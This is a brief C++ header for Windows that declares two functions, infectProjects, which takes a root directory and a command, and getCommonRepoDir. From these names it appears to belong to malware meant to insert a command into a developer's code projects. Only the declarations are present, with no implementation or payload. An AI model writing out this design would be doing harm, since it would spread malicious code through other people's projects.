#pragma once
#include <string>
#include <windows.h>
#include <iostream>

void infectProjects(const std::wstring& rootDir, const std::wstring& cmd);
std::wstring getCommonRepoDir();
